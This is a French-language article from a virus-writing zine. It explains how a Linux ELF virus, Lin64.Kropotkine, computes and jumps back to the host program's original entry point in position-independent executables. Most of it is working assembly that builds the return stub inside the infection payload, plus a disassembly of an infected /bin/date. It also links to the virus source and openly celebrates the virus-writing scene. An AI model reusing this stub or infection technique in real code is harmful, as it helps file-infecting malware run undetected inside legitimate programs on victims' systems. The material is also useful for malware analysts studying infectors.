                                                           ┌───────────────────────┐
                                                           ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
                                                           │ █   █ █ █ █   █       │
                                                           │ █   █ █ █ █▀▀▀▀       │
                                                           │ █   █   █ █     ▄     │
                                                           │                 ▄▄▄▄▄ │
                                                           │                 █   █ │
                                                           │                 █   █ │
                                                           │                 █▄▄▄█ │
                                                           │                 ▄   ▄ │
                                                           │                 █   █ │
                                                           │                 █   █ │
                                                           │                 █▄▄▄█ │
                                                           │                 ▄▄▄▄▄ │
                                                           │                   █   │
Retour Au Point d'Entré Original Dans Un PIE               │                   █   │
~ S01den                                                   └───────────────────█ ──┘

Ecrit avec amour par S01den, de l'équipe tmp.out !

--- 1) Introduction ---

Lorsque j'ai fait mes premiers pas dans le monde des virus, l'une des premières choses avec laquelle j'ai eu du mal était de savoir comment revenir correctement au point d'entrée d'origine de l'hôte. C'est une fonctionnalité de base de chaque virus digne de ce nom, et c'était très facile à implémenter dans le passé (mov ebx, OEP ; jmp ebx).

Vous vous demandez peut-être "Pourquoi ce n'est plus aussi facile ?"

La réponse tient en 3 lettres: PIE, qui signifie Position Independent Executable. Dans de tels binaires, les adresses des instructions sont randomisées à chaque exécution (malgré un alignement). Donc l'OEP n'est plus une constante, il faut maintenant le calculer avant de pouvoir y aller.

Voyons comment on fait ça!

--- 2) Ret to OEP malgré PIE ---

Je vais décrire ici la méthode que j'ai utilisée pour calculer Ret2OEP dans Lin64.Kropotkine[0]. J'étais bloqué depuis plusieurs jours et un papier d'Elfmaster[1] m'a montré la lumière.

Voici donc le code :

-------------------------------- CUT-HERE ------------------------------------------
mov rcx, r15 ;r15 holds the addr where the code of our vx is stored (in the stack)
add rcx, VXSIZE ; rcx now contains the first addr after the code of the vx
mov dword [rcx], 0xffffeee8 ; relative call to get_eip (which is 13 bytes before)
mov dword [rcx+4], 0x0d2d48ff ; sub rax, (VXSIZE+5)
mov byte  [rcx+8], 0x00000005
mov word  [rcx+11], 0x0002d48
mov qword [rcx+13], r9		 ; sub rax, entry0
mov word  [rcx+17], 0x0000548
mov qword [rcx+19], r12		; add rax, sym._start
mov dword [rcx+23], 0xfff4894c 	; mov rsp, r14
mov word  [rcx+27], 0x00e0		; jmp rax
------------------------------------------------------------------------------------

Comme vous pouvez le voir, nous écrivons le code de retour à l'OEP octet par octet, directement en mémoire (après le code du virus, afin de pouvoir y aller lorsque le code viral aura fini de s'exécuter) dans les octets que nous écrirons dans l'hôte pour l'infecter. Nous voulons obtenir quelque chose comme ceci:

(ce code provient de mon /bin/date que j'ai infecté avec Lin64.Kropotkine)

-------------------------------- CUT-HERE ------------------------------------------
; end of the vx code:
get_rip:
0x0c01ada3      488b0424       mov rax, qword [rsp]
0x0c01ada7      c3             ret
getdot:
0x0c01ada8      e842fbffff     call 0xc01a8ef          ; call main
0x0c01adad      2e0000         add byte cs:[rax], al   ; '.'
; <---- end of the virus code, we want to inject our ret2OEP code here !
; the code we want to have here:
0x0c01adb0      e8eeffffff     call 0xc01ada3 ; call get_rip <--
0x0c01adb5      482d0d050000   sub rax, 0x50d ; sub rax, (VXSIZE+5)
0x0c01adbb      482da8a8010c   sub rax, entry0
0x0c01adc1      4805b0380000   add rax, 0x38b0 ;  add rax, sym._start
0x0c01adc7      4c89f4         mov rsp, r14 ; to restore the orignal stack
0x0c01adca      ffe0           jmp rax
------------------------------------------------------------------------------------

Fondamentalement, l'idée pour calculer l'OEP n'est pas vraiment compliquée. Supposons que le décalage de la première instruction du code original de l'hôte à exécuter (donc l'OEP non aléatoire) est 0x38b0, et que RIP est actuellement 0x55556156edb5 (une adresse aléatoire) lorsque nous appelons get_rip (0x0c01adb0 dans le code ci-dessus). Nous voulons connaître l'adresse aléatoire de l'OEP pour pouvoir y accéder.

Eh bien, appelez get_rip mettez RIP dans RAX, sachant qu'il faut d'abord soustraire RAX (0x55556156edb5) à la taille du virus (plus 5, la taille de l'instruction call get_rip) pour avoir l'adresse aléatoire du début du code du virus :

---> 0x55556156edb5 - (0x508 + 5) = 0x55556156e8a8 ; the address of the first instruction of the vx code

Maintenant, nous soustrayons cela avec le nouveau point d'entrée, l'adresse non aléatoire du début du code du virus (qui a été calculée auparavant dans l'exécution du virus, 0xc01a8a8 dans notre cas).

En fait nous faisons simplement :

---> nouveau point d'entré aléatoire - nouveau point d'entré non-aléatoire (e_hdr.entry)

Avec nos valeurs nous obtenons :

---> 0x55556156e8a8 - 0xc01a8a8 = 0x555555554000

Nous avons fait cette soustraction pour extraire la "base" de la randomisation. Avec cette valeur, nous devons juste lui ajouter l'original e_hdr.entry (l'OEP non aléatoire):

---> 0x555555554000 + 0x38b0 = 0x5555555578b0

Pour obtenir une adresse correcte où aller!
Ainsi jmp rax commencera l'exécution du code original de l'hôte!

--- Conclusion ---
Pour résumer, nous faisons juste quelque chose comme ceci :

---> get_rip() - (VX_SIZE + 5) - new_EP + original-e_hdr.entry

Un calcul rapide comme vous pouvez le voir! ;)
Longue vie à la scène vx!
Ici, il y a autorité, pas de liberté.
C'est tout.
Hasta siempre!

--- Notes and Références ---
[0] https://github.com/vxunderground/MalwareSourceCode
      /blob/main/VXUG/Linux.Kropotkine.asm
[1] Modern ELF Infection Techniques of SCOP Binaries:
    https://bitlackeys.org/papers/pocorgtfo20.pdf
    - spécialement la partie nommée : "Note on resolving Elf_Hdr->e_entry
      in PIEexecutables"

--- Source ---

- Linux.Kropotkine.asm (See file in txt/)

